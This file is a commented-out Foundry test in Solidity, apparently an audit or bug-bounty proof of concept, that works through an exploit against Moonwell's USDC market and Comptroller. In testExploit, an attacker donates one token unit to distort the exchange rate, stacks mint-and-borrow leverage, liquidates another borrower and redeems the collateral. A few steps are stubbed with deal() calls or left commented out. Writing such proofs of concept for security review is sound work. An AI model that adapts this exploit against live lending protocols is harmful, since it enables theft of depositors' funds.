// // SPDX-License-Identifier: GPL-3.0-or-later
// pragma solidity ^0.8.0;

// import {TransparentUpgradeableProxy, ITransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
// import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
// import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// import "@forge-std/Test.sol";
// import "@forge-std/console.sol";

// import {MToken} from "@protocol/core/MToken.sol";
// import {Configs} from "@test/proposals/Configs.sol";
// import {Addresses} from "@test/proposals/Addresses.sol";
// import {Comptroller} from "@protocol/core/Comptroller.sol";
// import {TestProposals} from "@test/proposals/TestProposals.sol";
// import {MErc20Delegator} from "@protocol/core/MErc20Delegator.sol";

// contract LiveSystemTestPoC is Test {
//     TestProposals proposals;
//     Addresses addresses;

//     function setUp() public {
//         proposals = new TestProposals();
//         proposals.setUp();
//         proposals.setDebug(true);
//         addresses = proposals.addresses();

//         // Configs(address(proposals.proposals(0))).init(addresses); /// init configs so
//     }

//     function testMintMTokenSucceeds() public {
//         proposals.testProposals(true, true, true, true, true, false, false); /// deploy, after deploy, build, and run, do not validate

//         address sender = address(this);
//         uint256 mintAmount = 10000e6;

//         IERC20 token = IERC20(addresses.getAddress("USDC"));
//         MErc20Delegator mToken = MErc20Delegator(
//             payable(addresses.getAddress("MOONWELL_USDC"))
//         );

//         address burnt = vm.addr(0xdead);

//         vm.prank(address(mToken));
//         token.transfer(burnt, 1e18 - 10000000e6);
//         uint256 startingTokenBalance = token.balanceOf(address(mToken));
//         console.logString("starting supply");
//         console.logUint(mToken.totalSupply());
//         deal(address(token), sender, mintAmount);
//         console.logString("underlying balance user before mint");
//         console.logUint(token.balanceOf(address(this)));
//         console.logString("exchange rate before mint");
//         console.logUint(mToken.exchangeRateCurrent());
//         token.approve(address(mToken), mintAmount);

//         assertEq(mToken.mint(mintAmount), 0); /// ensure successful mint
//         assertTrue(mToken.balanceOf(sender) > 0); /// ensure balance is gt 0
//         assertEq(
//             token.balanceOf(address(mToken)) - startingTokenBalance,
//             mintAmount
//         ); /// ensure underlying balance is sent to mToken
//         console.logString("user mToken balancer after mint");
//         console.logUint(mToken.balanceOf(address(this)));
//     }

//     function testBorrowMTokenSucceeds() public {
//         testMintMTokenSucceeds();

//         address sender = address(this);
//         uint256 borrowAmount = 9000e6;

//         IERC20 token = IERC20(addresses.getAddress("USDC"));
//         MErc20Delegator mToken = MErc20Delegator(
//             payable(addresses.getAddress("MOONWELL_USDC"))
//         );
//         Comptroller comptroller = Comptroller(
//             addresses.getAddress("UNITROLLER")
//         );
//         uint256 startingTokenBalance = token.balanceOf(sender);

//         address[] memory mTokens = new address[](1);
//         mTokens[0] = address(mToken);

//         comptroller.enterMarkets(mTokens);
//         assertTrue(
//             comptroller.checkMembership(sender, MToken(address(mToken)))
//         ); /// ensure sender and mToken is in market
//         console.logString("exchange rate before user borrow");
//         console.logUint(mToken.exchangeRateCurrent());
//         assertEq(mToken.borrow(borrowAmount), 0); /// ensure successful borrow

//         assertEq(token.balanceOf(sender), borrowAmount); /// ensure balance is correct
//         console.logString("user borrow snap initial");
//         (, uint l, uint s) = comptroller.getAccountLiquidity(address(this));
//         console.logUint(l);
//         console.logUint(s);
//     }

//     function testExploit() public {
//         testBorrowMTokenSucceeds();
//         console.logAddress(address(this));
//         //attempt to seize
//         address attacker = vm.addr(0x696969);
//         console.logString("attacker addy");
//         console.logAddress(attacker);

//         IERC20 collateralToken = IERC20(addresses.getAddress("USDC"));

//         MErc20Delegator mToken = MErc20Delegator(
//             payable(addresses.getAddress("MOONWELL_USDC"))
//         );

//         console.logString("mtoken collateral balance");
//         console.logUint(collateralToken.balanceOf(address(mToken)));

//         Comptroller comptroller = Comptroller(
//             addresses.getAddress("UNITROLLER")
//         );
//         console.logString("borrow cap");
//         console.logUint(comptroller.borrowCaps(address(mToken)));
//         //exchange rate
//         console.logString("exchangeRate before manipulation");
//         console.logUint(mToken.exchangeRateCurrent());
//         (, , uint borrowBalance, ) = mToken.getAccountSnapshot(address(this));

//         console.logString("borrow balance");
//         console.logUint(borrowBalance);
//         console.logString("collateral supplied");
//         console.logUint(mToken.balanceOfUnderlying(address(this)));

//         //attacker mints
//         deal(address(collateralToken), attacker, 10000000e6 + 1);
//         //simulate flash loan to manipulate rate
//         vm.prank(attacker);
//         collateralToken.transfer(address(mToken), 1);
//         console.logString("supply cap");
//         console.logUint(comptroller.supplyCaps(address(mToken)));
//         console.logString("supply before mint");
//         console.logUint(mToken.totalSupply());
//         console.logString("attacker shares before mint");
//         console.logUint(mToken.balanceOf(address(attacker)));
//         {
//             vm.startPrank(attacker);

//             address[] memory m = new address[](1);
//             m[0] = address(mToken);
//             comptroller.enterMarkets(m);
//             collateralToken.approve(
//                 address(mToken),
//                 115792089237316195423570985008687907853269984665640564039457584007913129639935
//             );

//             assertEq(mToken.mint(10000000e6), 0, "attacker mint failed");
//             console.logString("exchange rate after attacker mint");
//             console.logUint(mToken.exchangeRateCurrent());
//             vm.stopPrank();
//         }
//         {
//             console.logString("attacker shares after mint");
//             uint attackerShares = mToken.balanceOf(address(attacker));
//             uint rate = mToken.exchangeRateCurrent();
//             uint equivalentAssetsToShares = (rate * attackerShares) / 1e18;
//             console.logUint(attackerShares);
//             console.logString("assets represented by attacker shares");
//             console.logUint(equivalentAssetsToShares);
//             vm.prank(attacker);
//             assertEq(
//                 mToken.borrow(((equivalentAssetsToShares * 9) / 10)),
//                 0,
//                 "borrow fail"
//             );
//             console.logString("current attacker token bal r1");
//             console.logUint(collateralToken.balanceOf(attacker));

//             // console.logString('attacker borrow snapshot');
//             //fully leverage borrows by using borrowed funds to mint more
//             uint amtToMintAttacker = mToken.borrowBalanceCurrent(attacker);
//             vm.prank(attacker);
//             assertEq(mToken.mint(amtToMintAttacker), 0, "mint 2 fail");

//             console.logString("attacker shares after mint 2");
//             attackerShares = mToken.balanceOf(address(attacker));
//             console.logUint(attackerShares);
//             rate = mToken.exchangeRateCurrent();
//             equivalentAssetsToShares =
//                 (rate * attackerShares) /
//                 1e18 -
//                 equivalentAssetsToShares;
//             console.logString(
//                 "assets represented by newly minted attacker shares"
//             );
//             console.logUint(equivalentAssetsToShares);
//             vm.prank(attacker);
//             assertEq(
//                 mToken.borrow(((equivalentAssetsToShares * 9) / 10)),
//                 0,
//                 "borrow 2 fail"
//             );
//             console.logString("total borrowed assets");
//             console.logUint(mToken.borrowBalanceCurrent(attacker));

//             console.logString("current attacker token bal r2");
//             console.logUint(collateralToken.balanceOf(attacker));

//             vm.prank(attacker);
//             assertEq(mToken.mint(8100000000000), 0, "mint 3 fail");
//             console.logString("attacker shares after mint 3");
//             attackerShares = mToken.balanceOf(address(attacker));
//             console.logUint(attackerShares);

//             equivalentAssetsToShares =
//                 (rate * attackerShares) /
//                 1e18 -
//                 equivalentAssetsToShares;
//             console.logString(
//                 "assets represented by newly minted attacker shares"
//             );
//             console.logUint(equivalentAssetsToShares);
//             vm.prank(attacker);
//             assertEq(
//                 mToken.borrow(((8100000000000 * 9) / 10)),
//                 0,
//                 "borrow 3 fail"
//             );

//             console.logString("attacker borrow bal");
//             console.logUint(mToken.borrowBalanceCurrent(attacker));
//             console.logString("attacker collat bal");
//             console.logUint(collateralToken.balanceOf(attacker));

//             vm.prank(attacker);
//             assertEq(mToken.mint(7290000000000), 0, "mint 4 fail");
//             console.logString("attacker shares after mint 4");
//             attackerShares = mToken.balanceOf(address(attacker));
//             console.logUint(attackerShares);

//             console.logString("mtoken collat");
//             console.logUint(collateralToken.balanceOf(address(mToken)));
//             console.logString("exchange rate before flash");
//             console.logUint(mToken.exchangeRateCurrent());

//             //simulate flashloan
//             // deal(address(collateralToken), attacker, 20000000e6);
//             // vm.prank(attacker);
//             // collateralToken.transfer(address(mToken), 20000000e6);

//             console.logString("exchange rate after flash");
//             console.logUint(mToken.exchangeRateCurrent());
//             {
//                 rate = mToken.exchangeRateCurrent();
//                 uint mTokenCollat = collateralToken.balanceOf(address(mToken));
//                 uint shareEquivalentToMTokenCollat = mTokenCollat / rate;
//                 console.logString("shares to withdraw all assets");
//                 console.logUint(shareEquivalentToMTokenCollat);

//                 console.log("mtoken collat bal before redeem");
//                 console.logUint(mTokenCollat);
//             }
//             deal(address(collateralToken), address(mToken), 100000e6);
//             // vm.prank(attacker);
//             // assertEq(mToken.redeem(7290000000000), 0, 'redeem fail');
//             console.log("mtoken collat bal after redeem");
//             console.logUint(collateralToken.balanceOf(address(mToken)));

//             // vm.prank(attacker);
//             // assertEq(comptroller.exitMarket(address(mToken)), 0, 'exit fail');

//             console.log("borrower snapshot");
//             (, uint l, uint s) = comptroller.getAccountLiquidity(address(this));
//             console.logUint(l);
//             console.logUint(s);
//         }
//         //liquidate borrower
//         {
//             (, uint amtToSeize) = comptroller.liquidateCalculateSeizeTokens(
//                 address(mToken),
//                 address(mToken),
//                 4033986490000000000000000000000000 / 1e18
//             );
//             console.logString("amt to seize");
//             console.logUint(amtToSeize);
//             console.logString("attacker shares before liq");
//             console.logUint(mToken.balanceOf(attacker));
//             console.logString("collat bal before deal (better to show delta)");
//             console.logUint(collateralToken.balanceOf(attacker));
//             deal(address(collateralToken), attacker, 4500000000);
//             vm.prank(attacker);
//             assertEq(
//                 mToken.liquidateBorrow(address(this), 4500000000, mToken),
//                 0,
//                 "liquidate fail"
//             );
//             console.logString("attacker shares after liq");
//             console.logUint(mToken.balanceOf(attacker));
//             console.logString("attacker collat after");
//             console.logUint(collateralToken.balanceOf(attacker));
//         }
//         //unwind stacked leverage of attacker
//         //simulate second flashloan? maybe seize removes the need for this.
//         deal(
//             address(collateralToken),
//             attacker,
//             14390000000000 + 10000000000000
//         );
//         vm.prank(attacker);
//         assertEq(
//             mToken.repayBorrow(14390000000000 + 10000000000000),
//             0,
//             "repay 1 fail"
//         );
//         console.logString("attacker shares");
//         console.logUint(mToken.balanceOf(attacker));
//         console.logString("attacker collat after repay borrow 1");
//         console.logUint(collateralToken.balanceOf(attacker));
//         vm.prank(attacker);
//         assertEq(mToken.redeem(16479536940285320137946), 0, "redeeeemsies");
//         console.logString("attacker collat redeem");
//         console.logUint(collateralToken.balanceOf(attacker));
//         console.logString("attacker shares");
//         console.logUint(mToken.balanceOf(attacker));
//         console.logString("attacker borrow bal");
//         console.logUint(mToken.borrowBalanceCurrent(attacker));
//         vm.prank(attacker);
//         assertEq(mToken.redeem(719948548920591126438), 0, "failsss");
//         console.logString("mtoken collat bal");
//         console.logUint(collateralToken.balanceOf(address(mToken)));
//         console.logString("attacker shares");
//         console.logUint(mToken.balanceOf(attacker));
//     }
// }
